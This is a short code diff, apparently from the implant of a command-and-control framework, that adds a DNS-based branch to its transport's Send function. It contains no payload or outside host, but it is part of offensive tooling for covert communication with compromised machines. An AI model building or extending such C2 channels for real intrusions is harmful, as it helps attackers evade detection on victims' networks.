@@ -168,4 +168,9 @@ auto Transport::Send(
         SendData, RecvData
     );
 #endif
+#if PROFILE_C2 == PROFILE_DNS
+    return Self->Tsp->DnsSend(
+        SendData, RecvData
+    );
+#endif
 }
